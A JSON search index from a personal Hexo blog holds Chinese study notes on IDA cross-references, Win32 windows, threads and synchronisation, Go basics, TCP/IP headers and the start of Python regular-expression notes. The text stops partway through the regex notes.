{"meta":{"title":"Fish","subtitle":"","description":"","author":"Fish","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2021-08-08T08:44:58.000Z","updated":"2021-08-08T08:44:58.351Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"五金盒","date":"2021-08-07T16:00:00.000Z","updated":"2021-08-08T08:39:58.677Z","comments":true,"path":"tools/index.html","permalink":"http://example.com/tools/index.html","excerpt":"","text":""},{"title":"Tags","date":"2021-08-08T08:29:30.352Z","updated":"2021-08-08T08:29:30.352Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"Categories","date":"2020-02-02T12:00:02.000Z","updated":"2021-08-08T08:29:35.429Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"🕵️‍♂️IDA中交叉引用和绘图功能","date":"2021-08-08T08:46:15.105Z","updated":"2021-08-08T08:46:15.105Z","comments":true,"path":"不想部署的/IDA/IDA交叉引用与绘图功能.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/IDA/IDA%E4%BA%A4%E5%8F%89%E5%BC%95%E7%94%A8%E4%B8%8E%E7%BB%98%E5%9B%BE%E5%8A%9F%E8%83%BD.html","excerpt":"","text":"文章所使用源码 12345678910111213141516171819#include &lt;stdio.h&gt;void depth_2_1() &#123; printf(&quot;inside depth_2_1\\n&quot;);&#125;void depth_2_2() &#123; fprintf(stderr, &quot;inside depth_2_2\\n&quot;);&#125;void depth_1() &#123; depth_2_1(); depth_2_2(); printf(&quot;inside depth_1\\n&quot;);&#125;int main() &#123; depth_1();&#125; 交叉引用交叉引用分为两种类型 代码交叉引用 数据交叉引用 交叉引用源头解释交叉引用源头一共有4个部分组成` 组成1：引用者名字 表示是在**___tmainCRTStartup**的函数中提出引用 组成2：开始字节 15A表示引用开始是在函数的第0x15A个字节处 组成3：引用位置相对目前的位置 箭头表示引用位置的相对方向，图中箭头向下，表示操作者需要向下滑动才可以看到，反之亦然 组成4：识别后缀 在IDA中，指令转交控制权的方式叫做流。IDA中有3中基本流：普通流，跳转流，基本流 类型 英文名称 普通流 ordinary flow 跳转流 jump flow 调用流 call flow 后缀意义 符号 引用方式 全称 p 代码交叉引用 Procedure w 写入交叉引用 write r 读取交叉引用 read o 偏移交叉引用 offset(偏移) 交叉引用列表 快捷键X，可以显示所有的交叉引用源，在这个文件中，write_it只被调用了三次 函数列表 函数外部调用图 IDA函数调用图 外部交叉引用图外部交叉引用有两种类型 目标符号交叉引用 [Xrefs To] 源符号交叉引用 [Xrefs From] Xrefs To​ IDA生成“交叉引用目标”图形，必须执行递归上升操作，即回溯所有以选定目标的符号为目标的交叉引用，直到到达一个没有其他符号引用的符号 puts函数(printf函数)XrefsTo图形，显示了所有到达puts函数的路径 Xrefs From​ 生成“交叉引用源头”图，需要执行递归下降操作，即跟踪所有以选定的符号为源头的交叉引用 main函数“交叉引用源头图” depth_1函数“交叉引用源头图” 简单理解 To表示源头，IDA可以递归出所有到达该源头的路径 From表示目标，IDA从选定处源头开始递归，找到从从源头开始的所有路径 对IDA来说来说To就是IDA从目标处向上递归，From就是IDA从目标处向下递归"},{"title":"🎦Win32学习记录(注册-创建窗口)-1","date":"2021-08-08T08:46:15.111Z","updated":"2021-08-08T08:46:15.111Z","comments":true,"path":"不想部署的/windows/Win32-1.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-1.html","excerpt":"","text":"WIn32窗口应用程序主函数:WinMain()123456int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 这是在Windows下编写的程序入口，下面对参数逐个解释 hInstance hInstance是应用程序的实例句柄。这里的实例句柄是程序装入内存后的起始地址。 通过GetModuleHandle() 参数来获得。 hPrevInstance 同一个文件创建的上一个实例句柄。这个参数在Win32下已经不再使用。 lpCmdLine 主函数的参数，用于在程序启动时给进程传递参数 点击开始，打开运行窗口，输入”notepad C:\\boot.ini”，这个命令的作用为将存储在C盘目录下的book.ini文件用记事本方式打开，点击确定，记事本弹出，由于我的C盘目录下没有这个文件，所以提示文件不存在。 nCmdShow 表示进程显示方式，可以为最大化，最小化，隐藏等显示方式。 WinMain中函数流程注册窗口类编写Windows程序，WinMain()函数的主要任务是注册一个窗口类，创建一个窗口并显示创建的窗口，在不停的获取属于自己的消息并分发给自己的窗口。知道接受到WM_QUIT消息后退出循环结束进程。 1234567891011121314151617181920212223242526272829303132333435int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; // TODO: Place code here. MSG Msg; BOOL bRet; //注册窗口类 MyRegisterClass(hInstance); //创建窗口并显示窗口 if(!InitInstance(hInstance, SW_SHOWNORMAL)) return FALSE; //消息循环 //获取属于自己的消息并进行分发 while( (bRet = GetMessage(&amp;Msg, NULL, 0, 0) != 0 ) &#123; if(bRet == -1) &#123; //handle the error and possibly exit //句柄错误强制退出 break; &#125; else &#123; TranslateMessage(&amp;Msg); DispatchMessage(&amp;Msg); &#125; &#125; return Msg.wParam;&#125; 下面对部分函数的作用进行解释 GetMessageMSDN对于该函数参数的解释 123456BOOL GetMessage( LPMSG lpMsg, // message information HWND hWnd, // handle to window UINT wMsgFilterMin, // first message UINT wMsgFilterMax // last message); 这个函数用来获取属于自己的消息，并填充MSG结构体 TranslateMessage1BOOL TranslateMessage( CONST MSG *lpMsg // message information); 该函数用于处理键盘消息。将虚拟码消息转换为字符消息 DispatchMessage1LRESULT DispatchMessage( CONST MSG *lpmsg // message information); 该函数作用为将消息分发给窗口 注册窗口类的自定义函数在WinMain()函数中，首先调用的是MyRegisterClass函数，该函数是我们自定义的函数，需要传递进程的实例句柄hInstance作为参数。 该函数完成窗口类的注册分为两步： 填充WNDCLASSEX结构体 。这个步骤较为复杂 调用RegisterClassEx函数进行注册 下面代码介绍了WNDCLASSEX结构体的所有成员，其中最重要的字段为lpfnWndProc，他将保存窗口的过程地址。窗口的过程是对各种消息进程处理的**”汇聚地”** 12345678910111213141516171819202122232425262728293031323334353637ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEX WndCls; //填充结构体为0 ZeroMemory(&amp;WndCls, sizeof(WNDCLASSEX)); //cbSize是结构体大小 WndCls.cbSize = sizeof(WNDCLASSEX); //lpfnWndProc是窗口过程地址 WndCls.lpfnWndProc = WindowProc; //hInstance是实例句柄 WndCls.hInstance = hInstance; //lpszClassName是窗口类类名 WndCls.lpszClassName = CLASSNAME; //style是窗口类风格 WndCls.style = 0x01; //hbrBackground是窗口类背景色 WndCls.hbrBackground = (HBRUSH)COLOR_WINDOWRARME + 1; //hCursor是鼠标句柄 WndCls.hCursor = LoadCursor(NULL, IDC_ARROW); //hIcon是图标句柄 WndCls.hIcon = LoadIcon(NULL, IDI_QUESTION); //其他 WndCls.cbClsExtra = 0; WndCls.cbWndExtra = 0; return RegisterClassEx(&amp;WndCls);&#125; 创建主窗口并显示更新注册窗口类后，根据该窗口类创建具体的主窗口并显示和更新窗口 123456789101112131415161718192021222324252627282930//创建窗口函数BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; HWND hWnd = NULL; //创建窗口 hWnd = CreateWindowEx(WS_EX_CLIENTEDGE, &quot;HelloWin32&quot;, &quot;MyFirstWindow&quot;, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, //窗口弹出的x轴 CW_USEDEFAULT, //弹出的y轴 CW_USEDEFAULT, //窗口宽 CW_USEDEFAULT, //窗口高 NULL, //父窗口 NULL, //菜单窗口 hInstance, //当前窗口句柄 NULL); if( NULL == hWnd ) &#123; return FALSE; &#125; //显示窗口 ShowWindow(hWnd, nCmdShow); //更新窗口 UpdateWindow(hWnd); return TRUE;&#125; 调用该函数，需要给该函数传递示例句柄和窗口的显示方式两个参数。分别为WinMain()函数的第1个参数和第3个参数。 创建主窗口时调用了CreateWindowEx()函数，通过MSDN查得函数原型 1234567891011HWND CreateWindowEx( DWORD dwExStyle, // extended window style LPCTSTR lpClassName, // registered class name LPCTSTR lpWindowName, // window name DWORD dwStyle, // window style int x, // horizontal position of window int y, // vertical position of window int nWidth, // window width int nHeight, // window height HWND hWndParent, // handle to parent or owner window HMENU hMenu, // menu handle or child identifier HINSTANCE hInstance, // handle to application instance LPVOID lpParam // window-creation data); 第2个参数是lpClassName,根据注释，该参数为已注册类名。这个已经注册的类名就是WNDCLASSEX结构体的lpszClassName字段 处理消息的窗口过程WindowProc函数介绍窗口过程的定义是按照MSDN上给出的形式进行定义的，MSDN中的定义如下 1234LRESULT CALLBACK WindowProc( HWND hwnd, // handle to window UINT uMsg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter); WindowProc是窗口过程的函数名，这个函数名可以随意改变，但是窗口过程的函数名必须与WNDCLASSEX结构体中lpfnWndProc的成员变量的值一致。下面介绍参数 参数1：窗口句柄 参数2：消息值uMsg 参数3与参数4：这两个参数是对于消息值的附加参数，具体用法需要参照MSDN 此函数也被称为回调函数，下面为消息回调函数代码 1234567891011121314151617181920212223242526272829303132333435363738394041LRESULT CALLBACK WindowProc( HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; PAINTSTRUCT ps; HDC hDC; RECT rt; char *pszDrawText = &quot;Hello Windows Program&quot;; switch(uMsg) &#123; case WM_PAINT: &#123; hDC = BeginPaint(hwnd, &amp;ps); GetClientRect(hwnd, &amp;rt); DrawTextA(hDC, pszDrawText, strlen(pszDrawText),&amp;rt, DT_CENTER | DT_VCENTER | DT_SINGLELINE); EndPaint(hwnd, &amp;ps); break; &#125; case WM_CLOSE: &#123; if(IDYES == MessageBox(hwnd, &quot;是否退出程序&quot;, &quot;MyFirstWin&quot;, MB_YESNO)) &#123; DestroyWindow(hwnd); PostQuitMessage(0); &#125; break; &#125; default: &#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); &#125; &#125; return 0;&#125; DefWindowProc介绍Windows的消息种类有上千种，但我们只需要处理程序需要的几种消息，其余的都交给系统处理，DefWindowProc函数就是进行不需要消息的处理 MSDN对DefWindowProc函数的定义如下 1234LRESULT DefWindowProc( HWND hWnd, // handle to window UINT Msg, // message identifier WPARAM wParam, // first message parameter LPARAM lParam // second message parameter); 这四个参数跟窗口过程参数相同。"},{"title":"🎦Win32学习记录-2(创建线程)","date":"2021-08-08T08:46:15.114Z","updated":"2021-08-08T08:46:15.114Z","comments":true,"path":"不想部署的/windows/Win32-2.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-2.html","excerpt":"","text":"✈✈图形化界面创建过程略过✈✈ CreateThread函数介绍 MSDN对CreateThread的解释 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); 中文版 123456789101112131415HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, // 安全属性 通常为NULL SIZE_T dwStackSize, // 参数用于设定线程可以将多少地址空间用于它自己的堆栈 // 每个线程拥有它自己的堆栈 LPTHREAD_START_ROUTINE lpStartAddress, // 参数用于指明想要新线程执行的线程函数的地址 LPVOID lpParameter, // 线程函数的参数 // 在线程启动执行时将该参数传递给线程函数// 既可以是数字，也可以是指向包含其他信息的一个数据结构的指针 DWORD dwCreationFlags, // 0 创建完毕立即调度 CREATE_SUSPENDED创建后挂起 LPDWORD lpThreadId // 线程ID ); // 返回值：线程句柄 界面资源介绍 WinMain函数12345678910int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)&#123; DialogBox(hInstance, MAKEINTRESOURCE(IDD_DIALOG_MAIN), NULL, DiaLogProc); return 0;&#125; DiaLogProc函数（消息回调函数）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354BOOL CALLBACK DiaLogProc( HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)&#123; switch (uMsg) &#123; case WM_INITDIALOG: &#123; ********************************获得两个窗口句柄*************************** hEDIT_ONE = GetDlgItem(hwndDlg, IDC_EDIT_ONE); hEDIT_TWO = GetDlgItem(hwndDlg, IDC_EDIT_TWO); ************************************************************************ ********************************初始化窗口******************************** SetWindowText(hEDIT_ONE, &quot;1000&quot;); SetWindowText(hEDIT_TWO, &quot;0&quot;); ************************************************************************ break; &#125; case WM_COMMAND: &#123; switch (LOWORD(wParam)) &#123; case IDC_BUTTON: &#123; *****************************创建了两个线程***************************** HANDLE hThread1 = ::CreateThread(NULL, 0, ThreadProc1, NULL, 0, NULL); HANDLE hThread2 = ::CreateThread(NULL, 0, ThreadProc2, NULL, 0, NULL); ********************************************************************** ::CloseHandle(hThread1); ::CloseHandle(hThread2); return TRUE; &#125; &#125; break; &#125; case WM_CLOSE: &#123; DestroyWindow(hwndDlg); &#125; default: &#123; return DefWindowProc(hwndDlg, uMsg, wParam, lParam); &#125; break; &#125;&#125; 线程函数1注意这里直接将返回值(线程句柄)设置为0，另外一个线程函数与这个相似，不在贴出来。 12345678910111213141516171819202122DWORD WINAPI ThreadProc1( LPVOID lpParameter)&#123; //将文本框中的输入传入Buffer中 TCHAR szBuffer[10]; memset(szBuffer, 0, 10); GetWindowText(hEDIT_ONE, szBuffer, 10); //将Buffer中的字符串转为数字 DWORD dwTimer; int check = sscanf((const char*)szBuffer, &quot;%d&quot;, &amp;dwTimer); while (dwTimer &gt; 0) &#123; Sleep(100); //在将数字减1后变为字符串 memset(szBuffer, 0, 10); sprintf((char*)szBuffer, &quot;%d&quot;, --dwTimer); //将字符串放回到文本框中 SetWindowText(hEDIT_ONE, szBuffer); &#125; return 0; &#125; 效果"},{"title":"🎦Win32学习记录-3(线程控制与临界区)","date":"2021-08-08T08:46:15.112Z","updated":"2021-08-08T08:46:15.112Z","comments":true,"path":"不想部署的/windows/Win32-3.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-3.html","excerpt":"","text":"多线程之间的资源抢占问题​ 当多个线程使用同一个资源时，会出现资源抢占问题 例子 ​ 这个程序功能为向文本框中加数字，每一次加一，两个线程同时加，每一个线程最多加到1000，当两个线程结束后，文本框中的期望值为2000。但是当同时按下两个按钮等待线程结束后，文本框中的结果却与期望值有偏差 线程函数1 代码 123456789101112131415161718DWORD WINAPI ThreadProc1(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; &#125; return 0;&#125; 线程函数2 代码 123456789101112131415161718DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; &#125; return 0;&#125; 两个线程函数步骤如下 文本框中取值 字符串 -&gt; 数字 数字自加1 数字 -&gt; 字符串 放回文本框中 问题 ​ 在windows系统中，一个线程使用一个CUP,但是电脑中的CPU有限，而电脑中又有很多进程，每一个进程中又存在很多线程，所以开发人员在设计的时候规定每一个线程使用CPU的时间为20ms，当一个线程20ms的时间用尽，只有等待下次为他分配时间时才可以继续工作。所以当两个线程同时操作一个全局变量时就会出现问题。 解决方案​ Windows设计出了临界区来解决线程抢占资源的问题 ​ 当多个设计程序多个线程都涉及到某个全局变量时，可以使用临界区来解决这个问题，临界区可以理解为给这个全局变量假定了一个令牌，这个令牌在程序中只有个块，只有拿到令牌的人才可以对全局变量进行操作。 ​ 将上面的线程函数做如下下修改，就可以解决多线程使用同一个全局变量的问题。 临界区结构体部分成员解释结构体定义如下 1234567891011121314typedef struct _RTL_CRITICAL_SECTION &#123; PRTL_CRITICAL_SECTION_DEBUG DebugInfo; // // The following three fields control entering and exiting the critical // section for the resource // LONG LockCount; LONG RecursionCount; HANDLE OwningThread; // from the thread&#x27;s ClientId-&gt;UniqueThread HANDLE LockSemaphore; ULONG_PTR SpinCount; // force size on 64-bit systems when packed&#125; RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; 死锁​ 临界区使用不当可能会造成死锁，当定义两个锁及以上使用需要格外小心，否则程序就可能造成死锁。下图就是死锁的基本原理，当使用临界区时，应该尽量注意将使用锁的使用顺序，经量将锁的使用顺序变成一样的。 试写死锁程序​ 死锁程序没有任何作用，但是可以加深对临界区的理解，且所谓的死锁程序只是逻辑上的，当写出来后也不一定会立刻生效。 线程1代码 1234567891011121314151617181920212223242526DWORD WINAPI ThreadProc1(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; EnterCriticalSection(&amp;cs1);//锁1 ***********容易产生死锁的位置*********** EnterCriticalSection(&amp;cs2);//锁2 GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; LeaveCriticalSection(&amp;cs2); LeaveCriticalSection(&amp;cs1); &#125; return 0;&#125; 线程2代码 1234567891011121314151617181920212223242526DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; TCHAR szBuffer[10]; DWORD dwIndex = 0; DWORD dwCount; while (dwIndex &lt; 1000) &#123; EnterCriticalSection(&amp;cs2);//锁2 ***********容易产生死锁的位置*********** EnterCriticalSection(&amp;cs1);//锁1 GetWindowText(hEDIT, szBuffer, 10); int check = sscanf(szBuffer, &quot;%d&quot;, &amp;dwCount); dwCount++; memset(szBuffer, 0, 10); sprintf(szBuffer, &quot;%d&quot;, dwCount); SetWindowText(hEDIT, szBuffer); dwIndex++; LeaveCriticalSection(&amp;cs1); LeaveCriticalSection(&amp;cs2); &#125; return 0;&#125;"},{"title":"go（变量类型与声明方式，循环）","date":"2021-08-08T09:27:36.392Z","updated":"2021-08-08T09:27:36.392Z","comments":true,"path":"不想部署的/go/GoStudy-1.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/go/GoStudy-1.html","excerpt":"","text":"命令xxx代表文件的绝对路径 只运行不编译 1go run xxx 编译文件 1go build xxx 生成工程项目 1go install 小知识点 go语言中每一个工程项目都需要有一个main包，这个包中的main函数是程序的入口点 1package main go语言中函数的花括号的前括号不能单独一行 ✔ 123 func main() &#123;defer fmt.Println(&quot;Hello World&quot;) &#125; ❌ 1234 func main() &#123;defer fmt.Println(&quot;Hello World&quot;) &#125; go语言中声明的变量必须使用，否则报错 GOPATH,GOROOT的关系 变量（常量）的声明和赋值 标准声明（先声明在赋值）12var variable_name int //variable_typevariable_name = 10 简化声明，自动推导类型1variable_name := 10 多重声明12//相同类型var a, b, c int 1234567//不同类型先声明后赋值 var( a int b float32)a = 10b = 1.1 12345//声明时赋值var( a int = 10 b float32 = 1.1) 12//简化写法var a, b = 1, 1.1 12//自动推导类型a, b, c := 1, 1.1, &quot;Tom&quot; 匿名变量go语言中存在匿名变量，用下划线表示，多用于接受函数返回值时使用，例子1234567891011121314package mainimport ( &quot;fmt&quot;)func anon_var() (a, b, c int) &#123; return 1, 2, 3&#125;func main() &#123; a, _, c := anon_var() fmt.Println(a, c)&#125; 上面代码anon_var函数返回三个值，但是我只想接收第一个和第三个，就是用匿名变量来忽略第二个返回值 iota枚举iota是go语言中的常量计数器，只能作用于常量const，例子如下 123456const ( a1 = iota a2 = iota a3 = iota )fmt.Println(a1, a2, a3) 123456//简化写法const ( a1 = iota a2 a3 ) 循环go语言中循环只有一种方式，for(range算迭代的话)，下面贴使用方法 不加任何条件：无线循环，除非使用break跳出循环 12345func main() &#123; for &#123; fmt.Println(&quot;fish&quot;) &#125;&#125; 普通使用方法：与c语言格式类似 12345func main() &#123; for i := 0; i &lt; 10; i++ &#123; fmt.Println(i) &#125;&#125; 与while循环格式类似的写法 12345678910111213func main() &#123; sum := 1 for ; sum &lt;= 10; &#123; sum += sum &#125; fmt.Println(sum) // 这样写也可以，更像 While 语句形式 for sum &lt;= 10&#123; sum += sum &#125; fmt.Println(sum)&#125; 与range一起使用 12345678//i代表下表，data代表数据func main() &#123; str := &quot;Hello Go&quot; for i, data := range str &#123; fmt.Println(i, data) &#125;&#125;"},{"title":"🎦Win32学习记录4(事件 互斥体 信号量)","date":"2021-08-08T09:16:44.580Z","updated":"2021-08-08T09:16:44.580Z","comments":true,"path":"不想部署的/windows/Win32-4.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/windows/Win32-4.html","excerpt":"","text":"对象状态 通知状态 ​ 表示操作系统可以调用 未通知状态 操作系统不可以调用 WaitForSingleObject函数 1234DWORD WaitForSingleObject( HANDLE hHandle, DWORD dwMilliseconds); hHandle 对象的句柄。 dwMilliseconds 超时间隔（以毫秒为单位）。如果指定了非零值，则函数将等待，直到发出信号通知对象或间隔过去为止。如果dwMilliseconds为零，则如果未用信号通知对象，则函数不会进入等待状态；否则，函数将进入等待状态。它总是立即返回。如果dwMilliseconds为INFINITE，则该函数仅在信号通知对象时返回。 WaitForMultipleObjects函数123456DWORD WaitForMultipleObjects( DWORD nCount, const HANDLE lpHandles, BOOL bWaitAll, DWORD dwMilliseconds); nCount lpHandles指向的数组中对象句柄的数量。对象句柄的最大数量为MAXIMUM_WAIT_OBJECTS。此参数不能为零。 lpHandles 对象句柄数组。 bWaitAll 如果此参数为TRUE，则当信号lpHandles数组中所有对象的状态时，该函数将返回。如果为FALSE，则当任何一个对象的状态设置为已信号通知时，该函数将返回。在后一种情况下，返回值指示其状态导致函数返回的对象。 dwMilliseconds 超时间隔（以毫秒为单位）。如果指定了非零值，则函数将等待，直到发出指定对象的信号或间隔过去为止。如果dwMilliseconds为零，则如果未发出指定对象的信号，则函数不会进入等待状态；否则，函数将进入等待状态。它总是立即返回。如果dwMilliseconds为INFINITE，则该函数仅在发出指定对象的信号时返回。 事件事件对象的创建 函数 123456HANDLE CreateEventA( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName); 参数 lpEventAttributes 内核对象都拥有该参数，一般情况下设置NULL bManualReset 布尔类型 TRUE 创建一个手动重置的时间对象，重置需要用到ResetEvent函数将事件状态设置为非信号状态(未通知状态) FALSE 创建一个自动重置事件对象,在释放单个等待线程后，系统自动将事件状态重置为未通知状态 {简单来说} bInitialState 如果此参数为TRUE，则表示事件对象的初始状态； FALSE，将显示事件对象的初始状态。否则，它是无信号的。 lpName 事件名称 事件对象的控制SetEvnet() 函数定义 123BOOL SetEvent( HANDLE hEvent); 将事件设置为已通知状态 ResetEvent 函数定义 123BOOL ResetEvent( HANDLE hEvent); 将事件设置为未通知状态 事件同步–消费者与生产者​ 事件的同步解释为将线程按照规定的顺序进行，线程被创建出来是被随机分配的CPU的，那个CPU空闲就分配给哪个线程(说得不是很专业，具体参照微软官方定义)，所以事件的同步可以理解为人为的控制线程运行的顺序 ​ 下面为用事件进行线程同步的思路 创建两个事件，事件A和事件B，一个事件初始化为通知状态，另一个初始化为已通知状态，且两个事件都设置为手动更改状态 12a_Event = CreateEvent(NULL, FALSE, TRUE, NULL);b_Event = CreateEvent(NULL, FALSE, FALSE, NULL); 创建线程1 1234567891011 DWORD WINAPI ThreadProc1(LPVOID lpParameter) &#123;for (int i = 0; i &lt; 10; i++) &#123; WaitForSingleObject(a_Event,INFINITE); printf(&quot;This is a Producer Create A+++++\\n&quot;); Sleep(500); SetEvent(b_Event); &#125; return 0; &#125; 在线程1中将事件B设置为已通知状态 创建线程2 1234567891011DWORD WINAPI ThreadProc2(LPVOID lpParameter)&#123; for (int i = 0; i &lt; 10; i++) &#123; WaitForSingleObject(b_Event,INFINITE); printf(&quot;This is a Consumer Destroy A-----\\n&quot;); Sleep(500); SetEvent(a_Event); &#125; return 0;&#125; 在结束时将线程1设置为已通知状态 这样就可以使两个线程交替进行，且充分利用了CPU 互斥体创建互斥体12345HANDLE CreateMutexA( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName); dwDesiredAccess 互斥体属于内核对象，一般情况下设置为NULL bInheritHandle 如果此值为TRUE，并且调用方创建了互斥量，则调用线程将获得该互斥对象的初始所有权。否则，调用线程将无法获得该互斥锁的所有权。 lpName 创建的互斥体的名称，如果在一个进程中使用可以为NULL，如果在不同进程中使用需要赋予名称 在其他进程中打开互斥体12345HANDLE OpenMutexW( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCWSTR lpName); dwDesiredAccess 互斥体属于内核对象，一般情况下设置为NULL bInheritHandle 如果此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄 lpName 需要打开的互斥体的名称 释放指定互斥对象的所有权123BOOL ReleaseMutex( HANDLE hMutex); hMutex 互斥对象的句柄。该 CreateMutex或OpenMutex函数返回此句柄。 信号量创建信号量123456HANDLE CreateSemaphoreW( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCWSTR lpName); lpSemaphoreAttributes 互斥体属于内核对象，一般情况下设置为NULL lInitialCount 信号量对象的初始计数。此值必须大于或等于零且小于或等于lMaximumCount。当信号量的计数大于零时，将发出信号状态；在信号量为零时，将不发出信号状态。每当等待函数释放等待信号量的线程时，计数就会减少一。通过调用ReleaseSemaphore函数将计数增加指定的数量 。 lMaximumCount 信号量对象的最大计数。该值必须大于零。 lpName 创建的信号量名称，可以NULL 释放等待信号量12345BOOL ReleaseSemaphore( HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount); hSemaphore 信号量对象的句柄。该 CreateSemaphore或 OpenSemaphore函数返回该句柄。 lReleaseCount 信号量对象的当前计数要增加的数量。该值必须大于零。如果指定的数量将导致信号量的计数超过创建信号量时指定的最大计数，则该计数不会更改，函数将返回FALSE。 lpPreviousCount 指向变量的指针，以接收信号量的先前计数。如果不需要上一个计数，则此参数可以为NULL。"},{"title":"TCP/IP","date":"2021-08-08T09:19:19.506Z","updated":"2021-08-08T09:19:19.506Z","comments":true,"path":"不想部署的/NetWork/TCP.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/NetWork/TCP.html","excerpt":"","text":"IP常用的三种类别IP地址地址解析协议ARPIP数据包格式子网划分 子网号不能为全0或全1 判断两台主机是否在同一网段，本主机的子网掩码与对方的IP地址进行与运算，在与自己的网络号进行比较 子网掩码超网划分（无分类编址CIDR）无分类的二级编址（**IP地址 ::= {&lt;网络前缀&gt;,&lt;主机号&gt;}**） 网际控制报文协议ICMPTCP 各字段意义序号如果报文数据部分长度为0，则默认增加1个字节 占4字节 首先，在传输过程的每一个字节都会有一个编号 在建立连接后，序号代表：这一次传给对方的TCP数据部分的第一个字节的编号 确认号当标志位中的ACK为1时，确认号才有效 占4字节 确认收到前面的包 在建立连接后，期望对方下一次发送的TCP数据部分第一个字节的开始序号 数据偏移 占4个bit（取值范围为5~15） Header Length乘5等于TCP首部长度（也等于数据偏移） 首部长度范围（20~60） 保留 占6个bit，一般情况下全为0 U/A/P/R/S/F URG（Urgent）当URG = 1时，紧急指针字段才有效。表明当前报文段中有紧急数据，应优先尽快传送 ACK（Acknowledgment）当ACK = 1时，确认号字段才有效 PSH（Push）RST（Reset）当RST = 1时，表明连接中出现严重差错，必须释放连接，然后再重新建立连接 SYN（Synchronization）当SYN = 1、ACK = 0 时，表明这是一个建立连接的请求若对方同意建立连接，则回复SYN = 1、ACK = 1 FIN（Finish）当FIN = 1时，表明数据已经发送完毕，要求释放连接 窗口检验和 伪首部+首部+数据部分 伪首部不会传输给下一层 紧急指针可靠传输ARQ（Automatic Repeat-reQuest） 理想情况 意外情况 确认丢失 确认迟到 缺点：效率非常低 连续ARQ+滑动窗口 SACK（selective 选择性确认） 包含于TCP首部可选部分 意外情况 流量控制拥塞控制建立连接 &amp;&amp; 释放连接 三次握手 第一次握手 第二次握手 第三次握手 四次挥手 将2，3次挥手合并"},{"title":"Python正则表达式练习","date":"2021-08-08T09:15:03.089Z","updated":"2021-08-08T09:15:03.089Z","comments":true,"path":"不想部署的/Python/Python-re.html","permalink":"http://example.com/%E4%B8%8D%E6%83%B3%E9%83%A8%E7%BD%B2%E7%9A%84/Python/Python-re.html","excerpt":"","text":"字符分类 \\d —– 0-9的任何数字 \\D —– 除开0-9的任何数字 \\w —– 任何字母，数字或下划线字符 \\W —– 除开字母，数字和下划线以外的任何字符 \\s —– 空格，制表符或换行符 \\S —– 除空格，制表符和换行符以外的任何字符 正则表达式基础12import re # 后面的代码中将默认引入msg = &#x27;My number is 415-555-4242 and 111-222-3333&#x27; # 下面例子中所使用的测试字符串 example_1 123456# search和findall的使用phoneNumRegex = re.compile(r&#x27;\\d\\d\\d-\\d\\d\\d-\\d\\d\\d\\d&#x27;)mo_1 = 